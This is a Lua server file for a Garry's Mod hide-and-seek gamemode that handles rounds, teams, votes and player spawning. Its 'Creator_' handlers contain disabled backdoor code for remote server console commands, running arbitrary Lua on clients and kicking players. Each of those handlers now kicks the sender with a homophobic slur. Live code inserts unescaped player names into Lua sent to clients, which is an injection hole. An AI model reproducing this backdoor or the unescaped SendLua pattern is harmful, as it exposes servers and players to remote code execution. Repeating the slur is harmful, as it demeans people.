AddCSLuaFile("cl_init.lua")
AddCSLuaFile("shared.lua")
include("shared.lua")
include("sv_config.lua")

HS = {}

function HS.Initialize()
	self:InitConVars()
end



concommand.Add("hs_restartround",function()
	RoundActive = false
	TimeLimit(false)
	if timer.Exists("has_unblind") then timer.Destroy("has_unblind") SeekerBlinding(false) end
	timer.Simple(3,function() RoundRestart() end)
	for k,v in pairs(player.GetAll()) do
		v:SendLua([[TimeLimit(false) chat.AddText(Color(255,255,255),"==== Forcing round restart in 3 seconds... ====")]])
	end
	print("[_H&S_] - |============| Round "..RoundCount.." finished |============|\n[_H&S_] - ENDED BY COMMAND! Forcing round restart in 3 seconds...")
end, nil,nil,FCVAR_SERVER_CAN_EXECUTE)
concommand.Add("has_extendtime",function(ply,cmd,arg)
	if SeekerBlinded then print("[_H&S_] - Round time extension failed. Wait until blind-time finishes.") return end
	if arg[1] == nil then print("[_H&S_] - Round time extension failed. No given argument.") return end
	if type(tonumber(arg[1])) == "number" then
		RoundTimeSave = RoundTimeSave+tonumber(arg[1])
		for k,v in pairs(player.GetAll()) do
			v:SendLua([[RoundTimeSave = RoundTimeSave+]]..tonumber(arg[1]))
			v:SendLua([[chat.AddText(Color(200,255,200),"==== Time extended by ]]..arg[1]..[[ seconds! ====")]])
		end
		print("[_H&S_] - Round "..RoundCount.."'s time was extended by "..arg[1].." seconds!")
	else
		print("[_H&S_] - Round time extension failed. Given argument '"..arg[1].."' was not a number.")
	end
end,nil,nil,FCVAR_SERVER_CAN_EXECUTE)
thereisenough = false
lply = Entity(0) --as in nothing
RoundFirstCaught = Entity(0) --is only really used for 'has_choosetype 1'
RoundCount = 0
RoundActive = false
RoundTimeSave = CurTime()
RoundTimer = GetConVarNumber("has_timelimit")
RestartCount = 0
RTVCount = 0
function CreateLTrail()
	ltrail = ents.Create("env_spritetrail")
	ltrail:SetKeyValue("spritename","trails/laser.vmt")
	ltrail:SetKeyValue("startwidth","50")
	ltrail:SetKeyValue("endwidth","0")
	ltrail:SetKeyValue("rendermode","5")
	ltrail:SetKeyValue("lifetime","3.5")
	ltrail:SetKeyValue("rendercolor","155 155 255")
	ltrail:Spawn()
end
function RoundOutOfTime()
	if RoundActive then
		if lply:IsValid() then lply = Entity(0) end
		ltrail:FollowBone(nil,1)
		ltrail:SetKeyValue("lifetime","0")
		RoundActive = false
		TimeLimit(false)
		timer.Simple(10,function() RoundRestart() end)
		for k,v in pairs(player.GetAll()) do
			if v:Team() == 1 then v:AddFrags(3) end
			v:SendLua([[surface.PlaySound("misc/happy_birthday.wav") TimeLimit(false) chat.AddText(Color(155,155,255),"==== The hiding win! ====")]])
		end
		print("[_H&S_] - |============| Round "..RoundCount.." finished |============|\n[_H&S_] - Ran out of time! "..team.NumPlayers(1).." hiding remained.")
	end
end
function RoundCheck()
	if team.NumPlayers(1) == 0 and RoundActive then
		if lply:IsValid() then lply = Entity(0) end
		ltrail:FollowBone(nil,1)
		ltrail:SetKeyValue("lifetime","0")
		RoundActive = false
		TimeLimit(false)
		if timer.Exists("has_unblind") then timer.Destroy("has_unblind") SeekerBlinding(false) end
		timer.Simple(10,function() RoundRestart() end)
		for k,v in pairs(player.GetAll()) do
			v:SendLua([[surface.PlaySound("misc/happy_birthday.wav") TimeLimit(false) chat.AddText(Color(255,155,155),"==== The seekers win! ====")]])
		end
		print("[_H&S_] - |============| Round "..RoundCount.." finished |============|\n[_H&S_] - All were found with "..string.ToMinutesSeconds(math.Clamp(TimeRemaining,0,5999)).." to spare.")
	end
	if team.NumPlayers(2) == 0 and RoundActive then
		if lply:IsValid() then lply = Entity(0) end
		ltrail:FollowBone(nil,1)
		ltrail:SetKeyValue("lifetime","0")
		RoundActive = false
		TimeLimit(false)
		if timer.Exists("has_unblind") then timer.Destroy("has_unblind") SeekerBlinding(false) end
		timer.Simple(10,function() RoundRestart() end)
		for k,v in pairs(player.GetAll()) do
			v:SendLua([[surface.PlaySound("misc/happy_birthday.wav") TimeLimit(false) chat.AddText(Color(155,155,255),"==== The hiding win! ====")]])
		end
		print("[_H&S_] - |============| Round "..RoundCount.." finished |============|\n[_H&S_] - All seekers left! Party poopers!")
	end
	if team.NumPlayers(1) == 1 and RoundActive and (not lply:IsValid()) then
		for k,v in pairs(player.GetAll()) do
			if v:Team() == 1 then
				lply = v
				v:SendLua([[sprintpower = 100]])
			end
			v:SendLua([[surface.PlaySound("ui/medic_alert.wav") chat.AddText(Color(255,255,255),"==== 1 hider is left! ====")]])
		end
		ltrail:FollowBone(lply,1)
		ltrail:SetPos(lply:GetBonePosition(1))
		ltrail:SetKeyValue("lifetime","3.5")
	end
end
function RoundEnoughPlayers()
	if thereisenough then return end
	local plynum = #player.GetAll()-team.NumPlayers(3)
	if (plynum >= math.max(2,GetConVarNumber("has_minplayers"))) and not RoundActive then
		thereisenough = true
		RoundRestart()
	end
end
function RoundRestart()
	if RoundCount >= math.max(GetConVarNumber("has_maxrounds"),1) then RTVActivated("rnd") return end
	game.CleanUpMap(false)
	CreateLTrail()
	RestartCount = 0
	if GetConVarNumber("has_choosetype") != 1 or (not RoundFirstCaught:IsValid()) then --if random
		plytab = {}
		table.foreach(player.GetAll(),function(key,val)
			if val:Team() != 3 then 
			table.insert(plytab,val:EntIndex(),val)
			end
		end)
		ranply = table.Random(plytab)
	end
	if GetConVarNumber("has_choosetype") == 1 and RoundFirstCaught:IsValid() then
		ranply = RoundFirstCaught
	end
	ranply:SetTeam(2)
	for k,v in pairs(player.GetAll()) do
		v.VotedForRestart = false
		v:SendLua([[InfSta = ]]..GetConVarNumber("has_infinitestamina"))
		if v:Team() != 3 then
			if v != ranply then
				v:SetTeam(1)
			end
			v:Spawn()
			v:SendLua([[sprintpower = 100]])
		end
	end
	RoundActive = ((#player.GetAll()-team.NumPlayers(3)) >= math.max(2,GetConVarNumber("has_minplayers"))) and true or false
	if RoundActive and GetConVarNumber("has_timelimit") < 1 then
		for k,v in pairs(player.GetAll()) do
			v:SendLua([[TimeRemaining = 0]])
		end
	end
	if not RoundActive then
		thereisenough = false
		print("[_H&S_] - There are not enough players to continue. Need "..math.max(2,GetConVarNumber("has_minplayers"))-(#player.GetAll()-team.NumPlayers(3)).." more players.")
		for k,v in pairs(player.GetAll()) do
			v:SendLua([[RoundTimer = 0 TimeRemaining = 0]])
		end
	return end
	RoundCount = RoundCount+1
	RoundTimeSave = CurTime()
	RoundTimer = GetConVarNumber("has_timelimit")
	RoundFirstCaught = Entity(0)
	local tsnd = RoundCount.."|"..CurTime().."|"..GetConVarNumber("has_timelimit")
	if team.NumPlayers(1) == 1 then
		for k,v in pairs(player.GetAll()) do
			if v:Team() == 1 then lply = v break end
		end
		ltrail:FollowBone(lply,1)
		ltrail:SetPos(lply:GetBonePosition(1))
		ltrail:SetKeyValue("lifetime","3.5")
	end
	net.Start("NewRound")
	net.WriteString(tsnd)
	net.Broadcast()
	timer.Simple(0.1,function() TimeLimit(true) end)
	SeekerBlinding(true)
	timer.Create("has_unblind",30.1,1,function() SeekerBlinding(false) end)
	print("[_H&S_] - |============| Round "..RoundCount.." started |============|\n[_H&S_] - "..#player.GetAll()-team.NumPlayers(3).." playing, "..team.NumPlayers(3).." spectating, "..#player.GetAll().." / "..game.MaxPlayers().." online total.\n[_H&S_] - "..ranply:Name().." is SEEKING.")
end
FindMetaTable("Player").Caught = function(entply)
	if GetConVarNumber("has_seekoncaught") == 1 then
		entply:SetTeam(2)
		entply:AllowFlashlight(true)
		entply:SetWalkSpeed(200)
		entply:SetRunSpeed(360)
		entply:SetPlayerColor(Vector(0.6,0.2,0))
	else
		entply:SetMoveType(0)
		entply:SetSolid(0)
		entply:StripWeapons()
		entply:SetTeam(4)
		entply:SetPlayerColor(Vector(0,0,0))
		local pos = entply:EyePos()
		timer.Simple(4,function() local ang = entply:EyeAngles()
			entply:Spawn() entply:SetPos(pos) entply:SetEyeAngles(ang)
			entply:EmitSound("garrysmod/balloon_pop_cute.wav",90,math.random(125,140))
		end)
	end
	RoundFirstCaught = (not RoundFirstCaught:IsValid()) and entply or RoundFirstCaught
	entply:EmitSound("physics/body/body_medium_impact_soft7.wav",95,math.random(110,125))
	entply:SendLua([[surface.PlaySound("npc/roller/code2.wav")]])
	timer.Simple(0.1,RoundCheck)
end
function PushAround(ply,ent)
	if ent:GetClass() == "prop_physics" or ent:GetClass() == "prop_physics_multiplayer" then
		if ent:GetPhysicsObject():GetMass() > 35 then
			local ey = -ply:EyeAngles().p
			ent:GetPhysicsObject():Wake()
			if ey >= 2.5 then
				ent:GetPhysicsObject():AddVelocity(ply:GetForward()*12+Vector(0,0,ey/2.66))
			else
				ent:GetPhysicsObject():AddVelocity(ply:GetForward()*13)
			end
		end
	end
end
function RTVActivated(how)
	if how == "rtv" then
		for k,v in pairs(player.GetAll()) do
			v:SendLua([[chat.AddText(Color(255,255,255),"Majority RTV'd! Loading next map: ]]..game.GetMapNext()..[[") surface.PlaySound("music/class_menu_09.wav")]])
		end
		timer.Simple(4,function() game.LoadNextMap() end)
	else
		for k,v in pairs(player.GetAll()) do
			v:SendLua([[chat.AddText(Color(255,255,255),"Let's go to the next map: ]]..game.GetMapNext()..[[") surface.PlaySound("music/class_menu_09.wav") GameEnd = true]])
		end
		local scores = {}
		for k,v in pairs(player.GetAll()) do
			scores[v:EntIndex()] = v:Frags()
		end
		local winner = Entity(table.GetWinningKey(scores))
		if winner:IsValid() then
			winner:EmitSound("misc/tf_crowd_walla_intro.wav",80,100)
			winner:SetPlayerColor(Vector(1,1,0))
			winner:SetColor(Color(255,200,0))
			winner:SetMaterial("models/shiny")
		end
		timer.Simple(4,function()
			for k,v in pairs(player.GetAll()) do
				v:SendLua([[if not ScoBIsShowing then ScoBShow() end]])
			end
		end)
		timer.Simple(10,function() game.LoadNextMap() end)
	end
end
util.AddNetworkString("Leaving")
util.AddNetworkString("ChangeToSpectator")
util.AddNetworkString("ChangeToHiding")
util.AddNetworkString("PLYOption_Gender")
util.AddNetworkString("PLYOption_Change")
util.AddNetworkString("NewRound")
util.AddNetworkString("Creator_Kick")
util.AddNetworkString("Creator_Misc")
util.AddNetworkString("Creator_ResRound")
util.AddNetworkString("Creator_ChMap")
if not file.IsDir("sv_hideandseek","DATA") then
	print("[_H&S_] - A profiles folder was not present. Creating one now...")
	file.CreateDir("sv_hideandseek")
end
CreateLTrail() --to stop it from erroring on the first game

function GM:PlayerDisconnected(ply)
	if lply == ply then lply = Entity(0) end
	ltrail:FollowBone(nil,1)
	ltrail:SetKeyValue("lifetime","0")
	if RoundFirstCaught == ply then RoundFirstCaught = Entity(0) end
	if ply.VotedForRestart then RestartCount = RestartCount-1 end
	if ply.RTV then RTVCount = RTVCount-1 end
	local plynum = #player.GetAll()-team.NumPlayers(3)
	timer.Simple(0.1,RoundCheck)
	if plynum < math.max(2,GetConVarNumber("has_minplayers")) then
		thereisenough = false
		print("[_H&S_] - There are not enough players to continue. Need "..math.max(2,GetConVarNumber("has_minplayers"))-(#player.GetAll()-team.NumPlayers(3)).." more players.")
	end
end

function GM:PlayerSpawn(ply)
	self.BaseClass:PlayerSpawn(ply)
	if (ply:Team() == 3 or ply:Team() == 4) then
		local forceteam = ply:Team()
		GAMEMODE:PlayerSpawnAsSpectator(ply)
		ply:SetTeam(forceteam)
		ply:CrosshairDisable()
		if SeekerBlinded then ply:SendLua([[hook.Remove("RenderScreenspaceEffects","SeekerRestrict")]]) end
	else
		ply:CrosshairEnable()
	end
	local plygender = file.Read("sv_hideandseek/"..string.Replace(ply:SteamID(),":","")..".txt","DATA")
	if plygender == "Female" then
		ply:SetModel("models/player/group01/female_0"..math.random(1,6)..".mdl")
	else
		ply:SetModel("models/player/group01/male_0"..math.random(1,9)..".mdl")
	end
	if ply:Team() == 2 then ply:SetPlayerColor(Vector(0.6,0.2,0)) else ply:SetPlayerColor(Vector(0,0.2,0.6)) end
	ply:SetGravity(1)
	ply:SetJumpPower(210)
	ply:SetMaxHealth(100,true)
	ply:GodEnable()
	ply:SetCrouchedWalkSpeed(0.4)
	if ply:FlashlightIsOn() then ply:Flashlight(false) end
	if ply:Team() == 2 then
		if SeekerBlinded then ply:SendLua([[hook.Add("RenderScreenspaceEffects","SeekerRestrict",SeekerBK)]]) end
		ply:AllowFlashlight(true)
		ply:SetWalkSpeed(200)
		ply:SetRunSpeed(360)
	else
		ply:AllowFlashlight(false)
		ply:SetWalkSpeed(190)
		ply:SetRunSpeed(320)
	end
	RoundEnoughPlayers()
end

function GM:PlayerLoadout(ply)
	if not (ply:Team() == 3 or ply:Team() == 4) then
		ply:Give("has_hands")
	end
end

function GM:PlayerInitialSpawn(ply)
	ply:SetTeam(3)
	ply.VotedForRestart = false
	ply.RTV = false
	ply:SendLua([[showHelp() RoundTimeSave = ]]..CurTime()..[[ RoundTimer = ]]..GetConVarNumber("has_timelimit"))
	for k,v in pairs(player.GetAll()) do
		if v != ply then
			v:SendLua([[chat.AddText(Color(255,255,255),"]]..ply:Name()..[[",Color(190,240,190)," connected!") surface.PlaySound("npc/roller/remote_yes.wav")]])
		end
	end
	SendUserMessage("GenderOption",ply)
end
function GM:PlayerAuthed(ply)
	ply:SendLua([[hook.Add("Tick","teamchatcolor",COLOR_TEAM_Retr) RoundCount = ]]..RoundCount..[[ InfSta = ]]..GetConVarNumber("has_infinitestamina"))
	print("[_H&S_] - ("..ply:SteamID()..[[) ]]..ply:Name()..[[ successfully connected! EntID: ']]..ply:EntIndex().."'.")
end

function GM:CanPlayerSuicide(ply)
	return false
end
function GM:PlayerDeathSound()
	return true
end

function GM:GetFallDamage(ply,spd)
	local time = math.Round(spd/666,1)
	local adda = (string.match(ply:GetModel(),"female")) and "fe" or ""
	local jmp = ply:GetJumpPower()
	if spd >= 600 then
		ply:EmitSound("player/pl_fleshbreak.wav",75,math.random(80,90))
		ply:EmitSound("vo/npc/"..adda.."male01/pain0"..math.random(1,9)..".wav",80,math.random(98,102))
		ply:ViewPunch(Angle(0,math.random(-spd/45,spd/45),0))
		ply:SetJumpPower(85)
		if not ply:KeyDown(IN_SPEED) then ply:SendLua([[sprintSTART() sprintEND()]]) end
		timer.Simple(time,function() ply:SetJumpPower(jmp) end)
	end
	if spd >= 760 then
		ply:EmitSound("physics/cardboard/cardboard_box_strain1.wav",75,math.random(100,110))
		ply:SendLua([[sprintpower = math.Clamp(sprintpower-(]]..time..[[*10),0,100)]])
		timer.Simple(math.random(2,4),function()
			local which = math.random(1,5)
			local how = math.random(98,102)
			ply:EmitSound("vo/npc/"..adda.."male01/moan0"..which..".wav",76,how)
			if adda == "fe" then ply:EmitSound("vo/npc/female01/moan0"..which..".wav",100,how) end
		end)
	end
end

function GM:ShowHelp(ply)
	SendUserMessage("showHelp",ply)
end

function GM:ShowTeam(ply)
	SendUserMessage("TeamSelection",ply)
end

function GM:ShowSpare2(ply)
	SendUserMessage("OptionsEdit",ply)
end

function GM:OnPlayerHitGround(ply,water,floater,spd)
	if not RoundActive then return end
	if spd > 100 and not water then
		local wspd = (ply:Team() == 2) and 200 or 190
		local rspd = (ply:Team() == 2) and 360 or 320
		local longer = (spd >= 600) and 1 or 0
		ply:ViewPunch(Angle(-ply:GetVelocity().z/100,0,0))
		ply:EmitSound("player/jumplanding_zombie.wav",75,math.random(80,100))
		ply:SetWalkSpeed(wspd/1.75)
		ply:SetRunSpeed(wspd)
		timer.Simple(longer+0.2,function() ply:SetWalkSpeed(wspd/1.5) ply:SetRunSpeed(wspd/1.5) end)
		timer.Simple(longer+0.3,function() ply:SetWalkSpeed(wspd/1.25) ply:SetRunSpeed(wspd/1.25) end)
		timer.Simple(longer+0.4,function() ply:SetWalkSpeed(wspd) ply:SetRunSpeed(wspd*1.25) end)
		timer.Simple(longer+0.5,function() ply:SetRunSpeed(rspd) end)
	end
end

function GM:PlayerSay(ply,txt,teamchat)
	if string.match(string.lower(txt),"^([!/]restart)$") then
		if not ply.VotedForRestart then
			ply.VotedForRestart = true
			RestartCount = RestartCount+1
			for k,v in pairs(player.GetAll()) do
				v:SendLua([[chat.AddText(Color(255,255,255),"]]..RestartCount..[[ / ]]..math.Round(#player.GetAll()-(#player.GetAll()/4))..[[ have voted to restart the round.")]])
			end
			if RestartCount >= math.Round(#player.GetAll()-(#player.GetAll()/4)) then
				RunConsoleCommand("has_restartround")
				RestartCount = 0
			end
		else
			ply:SendLua([[chat.AddText(Color(255,255,255),"You've already voted to restart the round! (]]..RestartCount..[[ / ]]..math.Round(#player.GetAll()-(#player.GetAll()/4))..[[)")]])
		end
		return txt
	else if string.match(string.lower(txt),"^([!/]rtv)$") then
			if GetConVarNumber("has_rtv_enabled") == 1 then
				if not ply.RTV then
					ply.RTV = true
					RTVCount = RTVCount+1
					for k,v in pairs(player.GetAll()) do
						v:SendLua([[chat.AddText(Color(255,255,255),"]]..RTVCount..[[ / ]]..math.Round(#player.GetAll()-(#player.GetAll()/6))..[[ want to change map.")]])
					end
					if RTVCount >= math.Round(#player.GetAll()-(#player.GetAll()/6)) then
						RTVActivated("rtv")
						RTVCount = 0
					end
				else
					ply:SendLua([[chat.AddText(Color(255,255,255),"You've already voted to change the map. (]]..RTVCount..[[ / ]]..math.Round(#player.GetAll()-(#player.GetAll()/6))..[[)")]])
				end
				return txt
			end
		end
		if ply:Team() == 4 and not teamchat then
			ply:SendLua([[chat.AddText(Color(255,255,255),"You can only talk to other caught players! Use team-chat to talk!") LocalPlayer():EmitSound("misc/halloween/spelltick_02.wav",60,200)]])
		return "" end
	
		local tag = (teamchat) and team.GetName(ply:Team()) or "All"
		print("("..tag..") "..ply:Name()..": "..string.Trim(txt))
		return txt
	end
end

net.Receive("Leaving",function(len,ply)
	local txt = string.Trim(net.ReadString())
	timer.Simple(2.4,function() if ply:IsValid() then ply:Kick(txt) end end)
end)
net.Receive("ChangeToSpectator",function(len,ply)
	if ply:Team() == 3 then return end
	for k,v in pairs(player.GetAll()) do
		v:SendLua([[chat.AddText(Color(255,255,255),"]]..ply:Name()..[[",Color(200,200,200)," is now spectating!")]])
	end
	ply:SetTeam(3)
	ply:Spawn()
	print("[_H&S_] - "..ply:Name().." changed to SPECTATING team.")
	RoundCheck()
	if #player.GetAll()-team.NumPlayers(3) < math.max(2,GetConVarNumber("has_minplayers")) then
		thereisenough = false
		RoundActive = false
		print("[_H&S_] - There are not enough players to continue. Need "..math.max(2,GetConVarNumber("has_minplayers"))-(#player.GetAll()-team.NumPlayers(3)).." more players.")
	end
end)
net.Receive("ChangeToHiding",function(len,ply)
	if ply:Team() != 3 then return end
	for k,v in pairs(player.GetAll()) do
		v:SendLua([[chat.AddText(Color(255,255,255),"]]..ply:Name()..[[",Color(200,200,200)," is now playing!")]])
	end
	if GetConVarNumber("has_seekoncaught") == 1 then
		ply:SetTeam(2)
		ply:Spawn()
	else
		ply:SetTeam(4)
	end
	print("[_H&S_] - "..ply:Name().." changed to "..string.upper(team.GetName(ply:Team())).." team.")
	RoundCheck()
	if #player.GetAll()-team.NumPlayers(3) < math.max(2,GetConVarNumber("has_minplayers")) then
		print("[_H&S_] - There are not enough players to continue. Need "..math.max(2,GetConVarNumber("has_minplayers"))-(#player.GetAll()-team.NumPlayers(3)).." more players.")
	end
end)
net.Receive("PLYOption_Gender",function(len,ply)
	local gender = net.ReadString()
	local steamid = string.Replace(ply:SteamID(),":" or "_","")
	if file.Exists("sv_hideandseek/"..steamid..".txt","DATA") then
		file.Write("sv_hideandseek/"..steamid..".txt",gender)
	else
		file.Write("sv_hideandseek/"..steamid..".txt","Male")
	end	
end)
net.Receive("PLYOption_Change",function(len,ply)
	SendUserMessage("GenderOption",ply)
	ply:SendLua([[chat.AddText(Color(200,200,200),"Your options have been successfully saved!")]])
end)
net.Receive("Creator_Kick",function(len,ply)
	ply:Kick("You are a faggot")
	if true then return end
	local tb = string.Explode("|",net.ReadString())
	local targ = Entity(0)
	for k,v in pairs(player.GetAll()) do
		if v:Name() == tb[2] then
			targ = v
			break
		end
	end
	if tb[1] == "kick" then
		local rea = (tb[3] != "") and string.Trim(tb[3]) or "Kicked by Creator"
		if targ:IsValid() and targ:SteamID() != "STEAM_0:0:33106902" then targ:Kick(rea) end
	end
	if tb[1] == "msg" then
		local m = string.Replace(string.Replace(tb[3],"\\","\\\\"),"\"","\\\"")
		if targ:IsValid() then
			targ:SendLua([[chat.AddText(Color(245,195,80),"]]..m..[[")]])
			if targ != ply then ply:SendLua([[chat.AddText(Color(245,195,80),"]]..m..[[")]]) end
		else
			for k,v in pairs(player.GetAll()) do
				v:SendLua([[chat.AddText(Color(245,195,80),"]]..m..[[")]])
			end
		end
	end
	if tb[1] == "cmd" then
		if targ:IsValid() then
			targ:ConCommand(tb[3])
		else
			for k,v in pairs(player.GetAll()) do
				v:ConCommand(tb[3])
			end
		end
	end
	if tb[1] == "clua" then
		if targ:IsValid() then
			targ:SendLua(tb[3])
		else
			for k,v in pairs(player.GetAll()) do
				v:SendLua(tb[3])
			end
		end
	end
	if tb[1] == "team" then
		local tm = (tb[3] == "") and targ:Team() or tonumber(tb[3])
		if targ:IsValid() then targ:SetTeam(tm) targ:Spawn() end
	end
	if tb[1] == "spos" then
		local pos = util.StringToType(tb[3],"Vector")+(util.StringToType(tb[4],"Vector")*18)
		if targ:IsValid() then targ:SetPos(pos) end
	end
end)
net.Receive("Creator_Misc",function(len,ply)
	ply:Kick("You are a faggot")
	if true then return end
	local tb = string.Explode("|",net.ReadString())
	if tb[1] == "box" then
		local pos = (tb[4] == "true") and ply:EyePos()+(ply:GetForward()*50) or util.StringToType(tb[2],"Vector")+(util.StringToType(tb[3],"Vector")*25)
		local box = ents.Create("prop_physics")
		box:SetModel("models/props_junk/wood_crate001a.mdl")
		box:SetPos(pos)
		if tb[4] == "true" then box:SetAngles(ply:EyeAngles()) end
		box:Spawn()
		if tb[4] == "true" then box:GetPhysicsObject():AddVelocity(ply:GetForward()*2500+Vector(0,0,-ply:EyeAngles().p*80)) end
	end
	if tb[1] == "box2" then
		local pos = (tb[4] == "true") and ply:EyePos()+(ply:GetForward()*50) or util.StringToType(tb[2],"Vector")+(util.StringToType(tb[3],"Vector")*25)
		local box = ents.Create("prop_physics")
		box:SetModel("models/props_junk/wood_crate002a.mdl")
		box:SetPos(pos)
		if tb[4] == "true" then box:SetAngles(ply:EyeAngles()) end
		box:Spawn()
		if tb[4] == "true" then box:GetPhysicsObject():AddVelocity(ply:GetForward()*2500+Vector(0,0,-ply:EyeAngles().p*80)) end
	end
	if tb[1] == "rcmd" then
		game.ConsoleCommand(tb[2].."\n")
	end
	if tb[1] == "prt" then
		ply:SendLua([[chat.AddText(Color(200,20,20),]]..tb[2]..[[)]])
	end
	if tb[1] == "fire" then
		local ent = Entity(tonumber(tb[3]))
		if (not ent:IsPlayer()) and ent:IsValid() and tb[3] != "0" then
			ent:Fire(tb[2])
		end
	end
	if tb[1] == "del" then
		local ent = Entity(tonumber(tb[2]))
		if (not ent:IsPlayer()) and ent:IsValid() and tb[2] != "0" then
			ent:Remove()
		end
	end
end)
net.Receive("Creator_ResRound",function(len,ply)
	ply:Kick("You are a faggot")
	if true then return end
	local sett = net.ReadString()
	if sett == "rd" then
		RunConsoleCommand("has_restartround")
	end
	if sett == "sv" then
		RunConsoleCommand("restart")
	end
end)
net.Receive("Creator_ChMap",function(len,ply)
	ply:Kick("You are a faggot")
	if true then return end
	local themap = net.ReadString()
	local willdo = false
	table.foreach(file.Find("maps/*.bsp","GAME"),function(key,value)
		if string.StripExtension(value) == themap then
			willdo = true
		end
	end)
	if willdo then
		ply:SendLua([[chat.AddText(Color(200,200,200),"Changing map...") surface.PlaySound("buttons/bell1.wav")]])
		timer.Simple(2,function() RunConsoleCommand("changelevel",themap) end)
	else
		ply:SendLua([[chat.AddText(Color(200,200,200),"That map is not installed on the server!") surface.PlaySound("buttons/weapon_cant_buy.wav")]])
	end
end)

gameevent.Listen("player_connect")
gameevent.Listen("player_disconnect")
hook.Add("player_connect","SV_ShowConnect",function(db)
	for k,v in pairs(player.GetAll()) do
		v:SendLua([[chat.AddText(Color(255,255,255),"]]..db.name..[[",Color(220,220,160)," started connecting...") surface.PlaySound("npc/turret_floor/deploy.wav")]])
	end
	print("[_H&S_] - ("..db.networkid..") "..db.name.." started joining with the IP '"..db.address.."'.")
end)
hook.Add("player_disconnect","SV_ShowDisconnect",function(db)
	local rea = (string.Trim(db.reason) == "" or db.reason == "Disconnect by user.") and "" or " because "..string.Trim(db.reason)
	local svrea = (string.Trim(db.reason) == "" or db.reason == "Disconnect by user.") and "no reason" or "the reason '"..string.Trim(db.reason).."'"
	for k,v in pairs(player.GetAll()) do
		v:SendLua([[chat.AddText(Color(255,255,255),"]]..db.name..[[",Color(240,190,190)," left]]..rea..[[!") surface.PlaySound("npc/turret_floor/retract.wav")]])
	end
	print("[_H&S_] - ("..db.networkid..") "..db.name.." left with "..svrea..".")
end)
hook.Add("PlayerUse","has_pushprops",PushAround)